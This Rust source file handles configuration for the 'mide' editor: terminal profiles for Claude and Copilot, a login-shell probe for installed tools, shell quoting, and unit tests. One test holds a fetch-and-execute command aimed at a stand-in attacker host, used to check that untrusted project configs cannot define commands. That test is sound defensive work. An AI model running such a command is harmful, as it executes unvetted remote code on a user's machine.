//! User configuration: `~/.config/mide/config.toml`, overridden per project by
//! `<project>/.mide/config.toml`. Both are optional.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::Deserialize;

pub const DEFAULT_SCROLLBACK: usize = 10_000;

/// A way to start a terminal session.
#[derive(Debug, Clone, PartialEq, Eq, Default, Deserialize)]
#[serde(default)]
pub struct Profile {
    pub name: String,
    /// Program to run through your login shell; omit for a plain shell.
    pub command: Option<String>,
    pub args: Vec<String>,
    /// Working directory, relative to the project root (default: the root).
    pub cwd: Option<String>,
    pub env: HashMap<String, String>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct TerminalSection {
    scrollback: Option<usize>,
    font_family: Option<String>,
    font_size: Option<f32>,
    profile: Vec<Profile>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct EditorSection {
    font_family: Option<String>,
    font_size: Option<f32>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct WorkspaceSection {
    /// Keep open files and terminal sessions when another folder is opened.
    keep_open_on_switch: Option<bool>,
    /// Reopen last session's files (and recover unsaved text) when a folder opens.
    restore_session: Option<bool>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct ProjectSection {
    open_terminals: Option<Vec<String>>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
pub struct ConfigFile {
    editor: EditorSection,
    workspace: WorkspaceSection,
    terminal: TerminalSection,
    project: ProjectSection,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Config {
    pub scrollback: usize,
    pub editor_font_family: String,
    pub editor_font_size: f32,
    /// Terminal font overrides; they follow the editor's when unset.
    pub terminal_font_family: Option<String>,
    pub terminal_font_size: Option<f32>,
    /// Opening another folder keeps the open files and terminals (default: closes them).
    pub keep_open_on_switch: bool,
    /// Reopen the files from last time and recover unsaved text (default: on).
    pub restore_session: bool,
    pub profiles: Vec<Profile>,
    /// Profile names to start when a project opens.
    pub open_terminals: Vec<String>,
}

/// Which AI command-line tools are installed (decides the built-in profiles).
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Tools {
    pub claude: bool,
    pub copilot: Copilot,
}

/// How GitHub Copilot's CLI is available, if at all.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum Copilot {
    #[default]
    Missing,
    /// The standalone `copilot` command (`npm i -g @github/copilot`, `brew install copilot-cli`).
    Standalone,
    /// Through the GitHub CLI: `gh copilot`.
    Gh,
}

impl Tools {
    /// Look in PATH and the usual install locations (fast, no subprocess).
    pub fn from_path() -> Self {
        let has = |p: &str| find_on_path(p).is_some();
        Self {
            claude: has("claude"),
            copilot: if has("copilot") {
                Copilot::Standalone
            } else if has("gh") {
                Copilot::Gh
            } else {
                Copilot::Missing
            },
        }
    }

    /// Union of two detections; a standalone `copilot` beats `gh copilot`.
    pub fn or(self, other: Tools) -> Tools {
        let copilot = match (self.copilot, other.copilot) {
            (Copilot::Standalone, _) | (_, Copilot::Standalone) => Copilot::Standalone,
            (Copilot::Gh, _) | (_, Copilot::Gh) => Copilot::Gh,
            _ => Copilot::Missing,
        };
        Tools { claude: self.claude || other.claude, copilot }
    }
}

/// Shown in the terminal when the Copilot profile is used but nothing is installed.
const COPILOT_MISSING_HELP: &str = "printf '\\nGitHub Copilot CLI is not installed.\\n\\n  Install:  npm install -g @github/copilot\\n       or:  brew install copilot-cli\\n  Then run: copilot     (use /login the first time)\\n\\n'; exec \"$SHELL\" -l";

/// Ask your login shell what is installed, since a GUI-launched app doesn't get
/// the PATH your terminal has (nvm, Homebrew, ~/.local/bin, ...). Slow-ish (starts an
/// interactive shell), so call it off the UI thread. Gives up after a few seconds.
pub fn probe_login_shell() -> Tools {
    use std::io::Read;
    use std::process::{Command, Stdio};
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".into());
    let script = "for c in claude copilot gh; do command -v $c >/dev/null 2>&1 && echo MIDE_HAS:$c; done";
    let Ok(mut child) = Command::new(shell)
        .args(["-l", "-i", "-c", script])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
    else {
        return Tools::default();
    };
    let mut out = child.stdout.take().expect("piped");
    let reader = std::thread::spawn(move || {
        let mut s = String::new();
        let _ = out.read_to_string(&mut s);
        s
    });
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(6);
    while std::time::Instant::now() < deadline {
        if matches!(child.try_wait(), Ok(Some(_))) {
            return parse_probe(&reader.join().unwrap_or_default());
        }
        std::thread::sleep(std::time::Duration::from_millis(25));
    }
    let _ = child.kill();
    let _ = child.wait();
    parse_probe(&reader.join().unwrap_or_default())
}

/// Parse `MIDE_HAS:<tool>` lines (shell start-up noise around them is ignored).
pub fn parse_probe(output: &str) -> Tools {
    let has = |name: &str| output.lines().any(|l| l.trim() == format!("MIDE_HAS:{name}"));
    Tools {
        claude: has("claude"),
        copilot: if has("copilot") {
            Copilot::Standalone
        } else if has("gh") {
            Copilot::Gh
        } else {
            Copilot::Missing
        },
    }
}

impl Config {
    /// Built-in defaults: a plain shell, plus Claude Code when it is installed.
    pub fn defaults(tools: Tools) -> Self {
        let mut profiles = vec![Profile { name: "Shell".into(), ..Profile::default() }];
        if tools.claude {
            profiles.push(Profile { name: "Claude".into(), command: Some("claude".into()), ..Profile::default() });
        }
        // Always listed so it is easy to find; if the CLI is missing the session says how to install it.
        profiles.push(Profile {
            name: "Copilot".into(),
            command: Some(match tools.copilot {
                Copilot::Standalone => "copilot".into(),
                Copilot::Gh => "gh copilot".into(),
                Copilot::Missing => COPILOT_MISSING_HELP.into(),
            }),
            ..Profile::default()
        });
        Self {
            scrollback: DEFAULT_SCROLLBACK,
            editor_font_family: crate::fonts::DEFAULT_FAMILY.to_owned(),
            editor_font_size: crate::fonts::DEFAULT_SIZE,
            terminal_font_family: None,
            terminal_font_size: None,
            keep_open_on_switch: false,
            restore_session: true,
            profiles,
            open_terminals: Vec::new(),
        }
    }

    /// Apply a parsed file on top: profiles replace same-named ones (or append),
    /// scalars override.
    pub fn merged(mut self, file: ConfigFile) -> Self {
        if let Some(n) = file.terminal.scrollback {
            self.scrollback = n;
        }
        let sane = |f: &f32| (6.0..=48.0).contains(f);
        if let Some(f) = file.editor.font_size.filter(sane) {
            self.editor_font_size = f;
        }
        if let Some(name) = file.editor.font_family.filter(|n| !n.trim().is_empty()) {
            self.editor_font_family = name.trim().to_owned();
        }
        if let Some(f) = file.terminal.font_size.filter(sane) {
            self.terminal_font_size = Some(f);
        }
        if let Some(name) = file.terminal.font_family.filter(|n| !n.trim().is_empty()) {
            self.terminal_font_family = Some(name.trim().to_owned());
        }
        if let Some(keep) = file.workspace.keep_open_on_switch {
            self.keep_open_on_switch = keep;
        }
        if let Some(restore) = file.workspace.restore_session {
            self.restore_session = restore;
        }
        for p in file.terminal.profile.into_iter().filter(|p| !p.name.trim().is_empty()) {
            match self.profiles.iter_mut().find(|q| q.name == p.name) {
                Some(slot) => *slot = p,
                None => self.profiles.push(p),
            }
        }
        if let Some(open) = file.project.open_terminals {
            self.open_terminals = open;
        }
        self
    }

    pub fn terminal_family(&self) -> &str {
        self.terminal_font_family.as_deref().unwrap_or(&self.editor_font_family)
    }

    pub fn terminal_size(&self) -> f32 {
        self.terminal_font_size.unwrap_or(self.editor_font_size)
    }

    pub fn profile(&self, name: &str) -> Option<&Profile> {
        self.profiles.iter().find(|p| p.name == name)
    }
}


impl ConfigFile {
    /// Drop everything that would run a program (profiles and auto-started sessions).
    /// Returns whether anything was dropped.
    fn strip_commands(&mut self) -> bool {
        let had = !self.terminal.profile.is_empty() || self.project.open_terminals.as_ref().is_some_and(|o| !o.is_empty());
        self.terminal.profile.clear();
        self.project.open_terminals = None;
        had
    }
}

pub fn parse(text: &str) -> Result<ConfigFile, String> {
    toml::from_str(text).map_err(|e| e.to_string())
}

pub fn global_path() -> Option<PathBuf> {
    std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".config/mide/config.toml"))
}

pub fn project_path(root: &Path) -> PathBuf {
    root.join(".mide/config.toml")
}

/// What [`load`] found.
pub struct Loaded {
    pub config: Config,
    /// Problems found while reading config files (the offending file is skipped).
    pub errors: Vec<String>,
    /// The project's config defines terminal commands but the folder is not trusted,
    /// so they were ignored (see `trust.rs`).
    pub blocked_commands: bool,
}

/// Load defaults + global + project. Problems are returned as messages and the
/// offending file is skipped, so a typo never stops the editor from starting.
///
/// Your own global config is always honored. A *project's* terminal profiles and
/// `open_terminals` are commands to run, so they only apply when `trusted`.
pub fn load(root: Option<&Path>, probed: Tools, trusted: bool) -> Loaded {
    let mut errors = Vec::new();
    let mut blocked = false;
    let mut cfg = Config::defaults(Tools::from_path().or(probed));
    let global = global_path().map(|p| (p, true));
    let project = root.map(|r| (project_path(r), trusted));
    for (path, allow_commands) in global.into_iter().chain(project) {
        let Ok(text) = std::fs::read_to_string(&path) else { continue };
        match parse(&text) {
            Ok(mut file) => {
                if !allow_commands {
                    blocked |= file.strip_commands();
                }
                cfg = cfg.merged(file);
            }
            Err(e) => errors.push(format!("{}: {}", path.display(), e.lines().next().unwrap_or("invalid"))),
        }
    }
    Loaded { config: cfg, errors, blocked_commands: blocked }
}

/// Where `claude` and friends usually live. A GUI app doesn't inherit your
/// shell's PATH, so a few well-known places are searched as well.
pub fn find_on_path(program: &str) -> Option<PathBuf> {
    let mut dirs: Vec<PathBuf> = std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect()).unwrap_or_default();
    if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
        dirs.extend([home.join(".local/bin"), home.join(".claude/local"), home.join(".cargo/bin"), home.join(".bun/bin")]);
    }
    dirs.extend(["/opt/homebrew/bin", "/usr/local/bin"].map(PathBuf::from));
    dirs.into_iter().map(|d| d.join(program)).find(|p| p.is_file())
}

/// Written when you choose "Edit Config" and the file doesn't exist yet.
pub const TEMPLATE: &str = r#"# mide configuration. A project can override any of this in .mide/config.toml.

[editor]
font_family = "Monaco"      # any installed monospace font, e.g. "Menlo", "SF Mono", "JetBrains Mono"
font_size = 12

[workspace]
# false: opening another folder closes the current files and terminals (default).
# true:  they stay open, now working in the new project.
keep_open_on_switch = false
# true: reopen last time's files and caret positions, and recover unsaved text after a crash.
restore_session = true

[terminal]
scrollback = 10000
# font_family / font_size here override [editor] for the terminal only

# Each profile is a way to start a terminal session (⌘⇧T picks one).
# A "Shell" profile always exists; "Claude" is added if `claude` is installed.

# [[terminal.profile]]
# name = "Claude"
# command = "claude"
# args = []
# cwd = "."                       # relative to the project root
# env = { ANTHROPIC_MODEL = "claude-opus-5-5" }

# [[terminal.profile]]
# name = "Copilot"                # built in; override it like this if needed
# command = "copilot"             # or "gh copilot"

# [[terminal.profile]]
# name = "Python"
# command = "zsh"
# args = ["-c", "source .venv/bin/activate && exec zsh"]

# [[terminal.profile]]
# name = "Vim"
# command = "vim"

[project]
# Sessions to start automatically when a folder opens (best set per project).
# open_terminals = ["Shell", "Claude"]
"#;

/// Quote one word for `sh`.
pub fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

fn is_simple_word(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || "_-./+".contains(c))
}

/// How to launch a profile. Commands run through your login shell (`-l -i`) so
/// they see the same PATH as in Terminal.app; a plain shell profile just starts
/// the default shell.
pub fn spawn_options(profile: &Profile, root: &Path, scrollback: usize) -> mide_term::SpawnOptions {
    let cwd = profile.cwd.as_ref().map(|c| root.join(c)).filter(|p| p.is_dir()).unwrap_or_else(|| root.to_owned());
    let program = profile.command.as_ref().map(|cmd| {
        let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".into());
        let args: String = profile.args.iter().map(|a| format!(" {}", shell_quote(a))).collect();
        // `exec` replaces the shell so exit codes and signals reach us directly,
        // but only for a plain program name (not `a && b`).
        let line = if is_simple_word(cmd) { format!("exec {cmd}{args}") } else { format!("{cmd}{args}") };
        (shell, vec!["-l".to_owned(), "-i".to_owned(), "-c".to_owned(), line])
    });
    mide_term::SpawnOptions {
        program,
        cwd: Some(cwd),
        env: profile.env.iter().map(|(k, v)| (k.clone(), v.clone())).collect(),
        scrollback: Some(scrollback),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn defaults_have_shell_and_optional_claude() {
        // Shell + the always-listed Copilot (Claude only when installed).
        assert_eq!(Config::defaults(Tools::default()).profiles.len(), 2);
        let c = Config::defaults(Tools { claude: true, copilot: Copilot::Standalone });
        assert_eq!(c.profile("Claude").unwrap().command.as_deref(), Some("claude"));
        assert_eq!(c.scrollback, 10_000);
    }

    #[test]
    fn parses_profiles_and_merges_by_name() {
        let global = parse(
            r#"
            [terminal]
            scrollback = 500
            [[terminal.profile]]
            name = "Claude"
            command = "claude"
            args = ["--verbose"]
            env = { A = "1" }
            [[terminal.profile]]
            name = "Vim"
            command = "vim"
            "#,
        )
        .unwrap();
        let project = parse(
            r#"
            [[terminal.profile]]
            name = "Claude"
            command = "claude"
            cwd = "backend"
            [project]
            open_terminals = ["Shell", "Claude"]
            "#,
        )
        .unwrap();
        let cfg = Config::defaults(Tools { claude: true, copilot: Copilot::Standalone }).merged(global).merged(project);
        assert_eq!(cfg.scrollback, 500);
        let names: Vec<_> = cfg.profiles.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, ["Shell", "Claude", "Copilot", "Vim"]); // Claude replaced in place, Vim appended
        let claude = cfg.profile("Claude").unwrap();
        assert_eq!(claude.cwd.as_deref(), Some("backend"));
        assert!(claude.args.is_empty() && claude.env.is_empty(), "project profile replaces, not merges");
        assert_eq!(cfg.open_terminals, ["Shell", "Claude"]);
    }

    #[test]
    fn bad_values_are_ignored_not_fatal() {
        let f = parse("[terminal]\nfont_size = 400\n[editor]\nfont_size = 2\nfont_family = \"  \"\n[[terminal.profile]]\nname = \"  \"\n").unwrap();
        let cfg = Config::defaults(Tools::default()).merged(f);
        assert_eq!(cfg.editor_font_size, crate::fonts::DEFAULT_SIZE);
        assert_eq!(cfg.editor_font_family, "Monaco");
        assert_eq!(cfg.terminal_font_size, None);
        assert_eq!(cfg.profiles.len(), 2, "the blank-named profile is dropped");
        assert!(parse("[terminal\nbroken").is_err());
    }

    #[test]
    fn fonts_default_to_monaco_and_terminal_follows_editor() {
        let d = Config::defaults(Tools::default());
        assert_eq!((d.editor_font_family.as_str(), d.editor_font_size), ("Monaco", 12.0));
        assert_eq!((d.terminal_family(), d.terminal_size()), ("Monaco", 12.0));

        let f = parse("[editor]\nfont_family = \"Menlo\"\nfont_size = 14\n").unwrap();
        let c = Config::defaults(Tools::default()).merged(f);
        assert_eq!((c.terminal_family(), c.terminal_size()), ("Menlo", 14.0));

        let f = parse("[terminal]\nfont_family = \"SF Mono\"\nfont_size = 11\n").unwrap();
        let c = c.merged(f);
        assert_eq!((c.editor_font_family.as_str(), c.editor_font_size), ("Menlo", 14.0));
        assert_eq!((c.terminal_family(), c.terminal_size()), ("SF Mono", 11.0));
    }

    #[test]
    fn switching_keeps_nothing_open_unless_asked() {
        assert!(!Config::defaults(Tools::default()).keep_open_on_switch);
        let c = Config::defaults(Tools::default()).merged(parse("[workspace]\nkeep_open_on_switch = true\n").unwrap());
        assert!(c.keep_open_on_switch);
    }

    #[test]
    fn template_is_valid_toml() {
        let f = parse(TEMPLATE).unwrap();
        let cfg = Config::defaults(Tools::default()).merged(f);
        assert_eq!(cfg.scrollback, 10_000);
        assert!(cfg.open_terminals.is_empty());
    }

    #[test]
    fn shell_quoting_and_spawn_options() {
        assert_eq!(shell_quote("a b"), "'a b'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");

        let root = std::env::temp_dir();
        let plain = spawn_options(&Profile { name: "Shell".into(), ..Profile::default() }, &root, 123);
        assert!(plain.program.is_none());
        assert_eq!(plain.cwd.as_deref(), Some(root.as_path()));
        assert_eq!(plain.scrollback, Some(123));

        let claude = Profile {
            name: "Claude".into(),
            command: Some("claude".into()),
            args: vec!["--model".into(), "o'pus".into()],
            cwd: Some("does-not-exist".into()), // falls back to the root
            env: HashMap::from([("A".to_owned(), "1".to_owned())]),
        };
        let o = spawn_options(&claude, &root, 10);
        let (_, args) = o.program.unwrap();
        assert_eq!(&args[..3], ["-l", "-i", "-c"]);
        assert_eq!(args[3], "exec claude '--model' 'o'\\''pus'");
        assert_eq!(o.cwd.as_deref(), Some(root.as_path()));
        assert_eq!(o.env, [("A".to_owned(), "1".to_owned())]);

        // Compound commands are not `exec`'d.
        let compound = Profile { name: "x".into(), command: Some("source .venv/bin/activate && exec zsh".into()), ..Profile::default() };
        assert!(!spawn_options(&compound, &root, 1).program.unwrap().1[3].starts_with("exec source"));
    }

    #[test]
    fn copilot_profile_is_always_listed_and_adapts_to_what_is_installed() {
        let cmd = |t: Tools| Config::defaults(t).profile("Copilot").unwrap().command.clone().unwrap();
        assert_eq!(cmd(Tools { claude: false, copilot: Copilot::Standalone }), "copilot");
        assert_eq!(cmd(Tools { claude: false, copilot: Copilot::Gh }), "gh copilot");
        let missing = cmd(Tools::default());
        assert!(missing.contains("npm install -g @github/copilot") && missing.contains("exec \"$SHELL\""));
        // Claude still only appears when installed; the order is Shell, Claude, Copilot.
        let names = |t: Tools| Config::defaults(t).profiles.iter().map(|p| p.name.clone()).collect::<Vec<_>>();
        assert_eq!(names(Tools::default()), ["Shell", "Copilot"]);
        assert_eq!(names(Tools { claude: true, copilot: Copilot::Gh }), ["Shell", "Claude", "Copilot"]);
    }

    #[test]
    fn user_profile_named_copilot_replaces_the_builtin() {
        let f = parse("[[terminal.profile]]\nname = \"Copilot\"\ncommand = \"copilot\"\nargs = [\"--banner\"]\n").unwrap();
        let c = Config::defaults(Tools::default()).merged(f);
        assert_eq!(c.profiles.iter().filter(|p| p.name == "Copilot").count(), 1);
        assert_eq!(c.profile("Copilot").unwrap().args, ["--banner"]);
    }

    #[test]
    fn probe_output_parsing_ignores_shell_noise() {
        let out = "Last login: Sun Nov 22\nsome plugin loaded\nMIDE_HAS:claude\nMIDE_HAS:gh\nwelcome!\n";
        assert_eq!(parse_probe(out), Tools { claude: true, copilot: Copilot::Gh });
        let out = "MIDE_HAS:copilot\nMIDE_HAS:gh\n";
        assert_eq!(parse_probe(out).copilot, Copilot::Standalone, "standalone beats gh");
        assert_eq!(parse_probe(""), Tools::default());
        assert_eq!(parse_probe("MIDE_HAS:claudex\n"), Tools::default(), "exact names only");
    }

    #[test]
    fn detections_combine() {
        let a = Tools { claude: true, copilot: Copilot::Missing };
        let b = Tools { claude: false, copilot: Copilot::Gh };
        assert_eq!(a.or(b), Tools { claude: true, copilot: Copilot::Gh });
        assert_eq!(b.or(Tools { claude: false, copilot: Copilot::Standalone }).copilot, Copilot::Standalone);
    }

    #[test]
    fn untrusted_project_configs_cannot_define_commands() {
        let mut f = parse(
            r#"
            [editor]
            font_size = 14
            [[terminal.profile]]
            name = "Build"
            command = "curl evil.example | sh"
            [project]
            open_terminals = ["Build"]
            "#,
        )
        .unwrap();
        assert!(f.strip_commands(), "something was dropped");
        let cfg = Config::defaults(Tools::default()).merged(f);
        assert!(cfg.profile("Build").is_none());
        assert!(cfg.open_terminals.is_empty());
        assert_eq!(cfg.editor_font_size, 14.0, "harmless settings still apply");

        // Nothing to drop: not reported as blocked.
        let mut plain = parse("[editor]\nfont_size = 13\n").unwrap();
        assert!(!plain.strip_commands());
    }
}
